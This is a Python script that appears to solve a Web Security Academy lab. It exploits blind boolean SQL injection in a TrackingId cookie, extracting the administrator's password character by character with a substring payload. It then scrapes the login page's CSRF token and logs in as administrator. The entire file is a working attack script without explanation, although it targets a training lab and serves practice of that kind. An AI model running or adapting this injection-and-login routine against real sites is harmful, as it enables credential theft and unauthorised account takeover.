import requests
import string
from bs4 import BeautifulSoup

URL = "https://0a3b006a04f248e1c0524fc900560036.web-security-academy.net/"
loginURL = "https://0a3b006a04f248e1c0524fc900560036.web-security-academy.net/login"
cookies = {'TrackingId':'', 'session':'WYhhdqScbakAXj77YG2g5vVB1VMvDeD6'}
TrackingId = "fmcJUaoz1cMlYCp3"
# proxies = {"https":"http://127.0.0.1:8080"}

all_letter_num = string.ascii_letters + string.digits
quit = False
index = 0
password = ""

print("Using payload: ' and (select substring(password,?,1) from users where username='administrator')='?")
print("[+] Dumping 'administrator' password: ", end="")
# print("Dumping administrator username")
while(quit == False):
	found = False
	index = index + 1
	# print("Trying index pos: {}".format(index))
	for char in all_letter_num:

		#' and (select(substring(password,1,1) from users where username='administrator')='a
		payload = "' and (select substring(password,{},1) from users where username='administrator')='{}".format(index,char)
		cookies['TrackingId'] = TrackingId+payload

		# res = requests.get(URL, cookies=cookies, proxies=proxies, verify=False)

		res = requests.get(URL, cookies=cookies)
		if "Welcome" in res.text:
			password = password + char
			print(char, end="",flush=True)
			found = True
			break

		if (found == False) and "9" in char:
			quit = True
			print("")
			print("[-] End")


#---login with found credentials--------------------------------------------------
if len(password) > 0:
	print("\nAttempt to login with credentials...")
	print("finding csrf token... ")
	html_content = requests.get(url = loginURL, cookies=cookies).text
	soup = BeautifulSoup(html_content, "html.parser")
	csrf_token = soup.find('input', {'name':'csrf'})['value']
	print(" [+] csrf token found! : {}".format(csrf_token))
	print("\nLoggin in... ")

	# data body
	# csrf=7XVCXSjAhQbU9Osbin89zpr0tCQUQVXn&username=test&password=pw
	data = "csrf={}&username={}&password={}".format(csrf_token,"administrator",password)

	res = requests.post(url = loginURL, data = data, cookies=cookies)

	#if login is successful you will see 'Log out' 
	if "Log out" in res.text:
		print(" [+] Successfully logged in!")
